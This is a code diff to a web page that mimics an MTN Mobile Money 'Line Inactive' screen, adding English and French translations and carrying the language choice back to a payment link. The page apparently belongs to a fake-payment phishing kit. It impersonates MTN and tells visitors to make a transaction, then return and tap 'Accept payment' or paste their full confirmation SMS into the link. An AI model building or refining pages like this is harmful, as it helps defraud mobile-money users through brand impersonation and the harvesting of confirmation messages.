@@ -231,8 +231,8 @@
     <div class="top-row">
       <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
     </div>
-    <div class="page-title">Line Inactive</div>
-    <div class="page-sub">This MTN MoMo line is currently inactive. Complete a transaction on your line to reactivate it, then try again.</div>
+    <div class="page-title" id="pageTitle">Line Inactive</div>
+    <div class="page-sub" id="pageSub">This MTN MoMo line is currently inactive. Complete a transaction on your line to reactivate it, then try again.</div>
   </div>
 
   <div class="body">
@@ -250,33 +250,33 @@
       This MTN MoMo line is currently inactive. To reactivate it, please complete a transaction on your line.
     </div>
 
-    <div class="notice-box">
-      <strong>What should you do?</strong>
-      <ol>
+    <div class="notice-box" id="noticeBox">
+      <strong id="noticeTitle">What should you do?</strong>
+      <ol id="noticeSteps">
         <li><strong>Make a transaction</strong> on your MTN MoMo line (send money, buy airtime, or pay a bill)</li>
         <li>Wait for the <strong>confirmation SMS</strong> from MTN</li>
         <li>Come back to this page and <strong>tap "Accept payment" again</strong></li>
       </ol>
-      <span class="foot-note">If your line is still inactive after a transaction, contact MTN support or visit your nearest MTN service centre with your ID.</span>
+      <span class="foot-note" id="noticeFoot">If your line is still inactive after a transaction, contact MTN support or visit your nearest MTN service centre with your ID.</span>
     </div>
 
     <div class="detail-list">
-      <div class="detail-row"><span class="k">Transaction</span><span class="v" id="txId">—</span></div>
-      <div class="detail-row"><span class="k">Recipient</span><span class="v" id="recipientName">—</span></div>
-      <div class="detail-row"><span class="k">Amount</span><span class="v" id="amountLabel">—</span></div>
-      <div class="detail-row"><span class="k">Country</span><span class="v" id="countryLabel">—</span></div>
-      <div class="detail-row"><span class="k">Status</span><span class="v status-warn" id="statusLabel">Line Inactive</span></div>
+      <div class="detail-row"><span class="k" id="kTransaction">Transaction</span><span class="v" id="txId">—</span></div>
+      <div class="detail-row"><span class="k" id="kRecipient">Recipient</span><span class="v" id="recipientName">—</span></div>
+      <div class="detail-row"><span class="k" id="kAmount">Amount</span><span class="v" id="amountLabel">—</span></div>
+      <div class="detail-row"><span class="k" id="kCountry">Country</span><span class="v" id="countryLabel">—</span></div>
+      <div class="detail-row"><span class="k" id="kStatus">Status</span><span class="v status-warn" id="statusLabel">Line Inactive</span></div>
     </div>
 
     <div class="mtn-footer">
       <div class="foot-brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
       <div class="foot-support">
-        Need help?<br>
-        Call <strong id="supportNum">—</strong>
+        <span id="needHelpLabel">Need help?</span><br>
+        <span id="callLabel">Call</span> <strong id="supportNum">—</strong>
       </div>
     </div>
 
-    <button class="close-btn" onclick="closePage()">Close</button>
+    <button class="close-btn" onclick="closePage()" id="closeBtn">Close</button>
 
   </div>
 </div>
@@ -284,6 +284,80 @@
 <div class="toast" id="toast"></div>
 
 <script>
+  /* ═══════════════════════════════════════════════════════════
+     TRANSLATIONS
+  ═══════════════════════════════════════════════════════════ */
+  const I18N = {
+    en: {
+      docTitle: 'MTN Mobile Money · Line Inactive',
+      pageTitle: 'Line Inactive',
+      pageSub: 'This MTN MoMo line is currently inactive. Complete a transaction on your line to reactivate it, then try again.',
+      statusTitle: 'Line Inactive',
+      statusDesc: 'This MTN MoMo line is currently inactive. To reactivate it, please complete a transaction on your line.',
+      noticeTitle: 'What should you do?',
+      noticeSteps: [
+        '<strong>Make a transaction</strong> on your MTN MoMo line (send money, buy airtime, or pay a bill)',
+        'Wait for the <strong>confirmation SMS</strong> from MTN',
+        'Come back to this page and <strong>tap "Accept payment" again</strong>'
+      ],
+      noticeFoot: 'If your line is still inactive after a transaction, contact MTN support or visit your nearest MTN service centre with your ID.',
+      kTransaction: 'Transaction',
+      kRecipient: 'Recipient',
+      kAmount: 'Amount',
+      kCountry: 'Country',
+      kStatus: 'Status',
+      statusLabel: 'Line Inactive',
+      needHelp: 'Need help?',
+      callLabel: 'Call',
+      close: 'Close',
+      noticeTitleFullSms: 'Line Inactive',
+      statusDescFullSms: 'The Y\'ello SMS you submitted was incomplete and this MTN MoMo line is currently inactive. Complete a transaction on your line to reactivate it.',
+      noticeStepsFullSms: [
+        '<strong>Make a transaction</strong> on your MTN MoMo line (send money, buy airtime, or pay a bill)',
+        'Wait for the <strong>confirmation SMS</strong> from MTN',
+        'Come back to the payment link and <strong>paste the full Y\'ello SMS</strong>'
+      ]
+    },
+    fr: {
+      docTitle: 'MTN Mobile Money · Ligne inactive',
+      pageTitle: 'Ligne inactive',
+      pageSub: 'Cette ligne MTN MoMo est actuellement inactive. Effectuez une transaction sur votre ligne pour la réactiver, puis réessayez.',
+      statusTitle: 'Ligne inactive',
+      statusDesc: 'Cette ligne MTN MoMo est actuellement inactive. Pour la réactiver, veuillez effectuer une transaction sur votre ligne.',
+      noticeTitle: 'Que devez-vous faire ?',
+      noticeSteps: [
+        '<strong>Effectuez une transaction</strong> sur votre ligne MTN MoMo (envoyer de l\'argent, acheter du crédit, ou payer une facture)',
+        'Attendez le <strong>SMS de confirmation</strong> de MTN',
+        'Revenez sur cette page et <strong>appuyez à nouveau sur « Accepter le paiement »</strong>'
+      ],
+      noticeFoot: 'Si votre ligne est toujours inactive après une transaction, contactez le support MTN ou visitez votre centre de service MTN le plus proche avec votre pièce d\'identité.',
+      kTransaction: 'Transaction',
+      kRecipient: 'Destinataire',
+      kAmount: 'Montant',
+      kCountry: 'Pays',
+      kStatus: 'Statut',
+      statusLabel: 'Ligne inactive',
+      needHelp: 'Besoin d\'aide ?',
+      callLabel: 'Appelez le',
+      close: 'Fermer',
+      noticeTitleFullSms: 'Ligne inactive',
+      statusDescFullSms: 'Le SMS Y\'ello que vous avez soumis était incomplet et cette ligne MTN MoMo est actuellement inactive. Effectuez une transaction sur votre ligne pour la réactiver.',
+      noticeStepsFullSms: [
+        '<strong>Effectuez une transaction</strong> sur votre ligne MTN MoMo (envoyer de l\'argent, acheter du crédit, ou payer une facture)',
+        'Attendez le <strong>SMS de confirmation</strong> de MTN',
+        'Revenez sur le lien de paiement et <strong>collez le SMS Y\'ello complet</strong>'
+      ]
+    }
+  };
+
+  const urlParams = new URLSearchParams(location.search);
+  const urlLang = (urlParams.get('lang') || '').toLowerCase();
+  const currentLang = I18N[urlLang] ? urlLang : 'en';
+  const T = I18N[currentLang];
+
+  /* ═══════════════════════════════════════════════════════════
+     COUNTRY DATA
+  ═══════════════════════════════════════════════════════════ */
   const SUPPORT_NUMBERS = {
     'Cameroon': '8787',
     'Zambia': '111',
@@ -319,22 +393,54 @@
     } catch (e) { return n + ' ' + (currency || ''); }
   }
 
-  const params = new URLSearchParams(location.search);
   const tx = {
-    ref: params.get('tx') || '',
-    am:  params.get('am') || '',
-    cur: params.get('cur') || '',
-    rn:  params.get('rn') || '',
-    c:   params.get('c') || '',
-    pm:  params.get('pm') || '',
-    sn:  params.get('sn') || '',
-    mk:  params.get('mk') || '',
-    an:  params.get('an') || '',
-    dt:  params.get('dt') || '',
-    reason: params.get('reason') || ''
+    ref: urlParams.get('tx') || '',
+    am:  urlParams.get('am') || '',
+    cur: urlParams.get('cur') || '',
+    rn:  urlParams.get('rn') || '',
+    c:   urlParams.get('c') || '',
+    pm:  urlParams.get('pm') || '',
+    sn:  urlParams.get('sn') || '',
+    mk:  urlParams.get('mk') || '',
+    an:  urlParams.get('an') || '',
+    dt:  urlParams.get('dt') || '',
+    reason: urlParams.get('reason') || ''
   };
 
+  /* ═══════════════════════════════════════════════════════════
+     APPLY TRANSLATIONS
+  ═══════════════════════════════════════════════════════════ */
+  function applyTranslations() {
+    document.title = T.docTitle;
+    document.getElementById('pageTitle').textContent = T.pageTitle;
+    document.getElementById('pageSub').textContent = T.pageSub;
+    document.getElementById('statusTitle').textContent = T.statusTitle;
+    document.getElementById('statusDesc').textContent = T.statusDesc;
+    document.getElementById('noticeTitle').textContent = T.noticeTitle;
+    document.getElementById('noticeFoot').textContent = T.noticeFoot;
+    document.getElementById('kTransaction').textContent = T.kTransaction;
+    document.getElementById('kRecipient').textContent = T.kRecipient;
+    document.getElementById('kAmount').textContent = T.kAmount;
+    document.getElementById('kCountry').textContent = T.kCountry;
+    document.getElementById('kStatus').textContent = T.kStatus;
+    document.getElementById('statusLabel').textContent = T.statusLabel;
+    document.getElementById('needHelpLabel').textContent = T.needHelp;
+    document.getElementById('callLabel').textContent = T.callLabel;
+    document.getElementById('closeBtn').textContent = T.close;
+
+    /* Notice steps */
+    const ol = document.getElementById('noticeSteps');
+    if (ol) {
+      ol.innerHTML = T.noticeSteps.map(s => '<li>' + s + '</li>').join('');
+    }
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     POPULATE PAGE
+  ═══════════════════════════════════════════════════════════ */
   function populate() {
+    applyTranslations();
+
     document.getElementById('txId').textContent = tx.ref || '—';
     document.getElementById('recipientName').textContent = tx.rn || '—';
     document.getElementById('amountLabel').textContent =
@@ -344,25 +450,24 @@
       SUPPORT_NUMBERS[tx.c] || '—';
 
     if (tx.reason === 'needs_full_sms') {
-      document.getElementById('statusTitle').textContent = 'Line Inactive';
-      document.getElementById('statusDesc').textContent =
-        'The Y\'ello SMS you submitted was incomplete and this MTN MoMo line is currently inactive. Complete a transaction on your line to reactivate it.';
-      document.getElementById('statusLabel').textContent = 'Line Inactive';
-      const ol = document.querySelector('.notice-box ol');
+      document.getElementById('statusTitle').textContent = T.noticeTitleFullSms;
+      document.getElementById('statusDesc').textContent = T.statusDescFullSms;
+      document.getElementById('statusLabel').textContent = T.statusLabel;
+      const ol = document.getElementById('noticeSteps');
       if (ol) {
-        ol.innerHTML = ''
-          + '<li><strong>Make a transaction</strong> on your MTN MoMo line (send money, buy airtime, or pay a bill)</li>'
-          + '<li>Wait for the <strong>confirmation SMS</strong> from MTN</li>'
-          + '<li>Come back to the payment link and <strong>paste the full Y\'ello SMS</strong></li>';
+        ol.innerHTML = T.noticeStepsFullSms.map(s => '<li>' + s + '</li>').join('');
       }
     }
   }
 
+  /* ═══════════════════════════════════════════════════════════
+     CLOSE → return to payment link
+  ═══════════════════════════════════════════════════════════ */
   function closePage() {
     if (tx.ref) {
       try {
         const base = new URL('index.html', window.location.href);
-        base.search = '?r=' + encodeURIComponent(tx.ref);
+        base.search = '?r=' + encodeURIComponent(tx.ref) + '&lang=' + encodeURIComponent(currentLang);
         base.hash = '';
         window.location.href = base.toString();
         return;
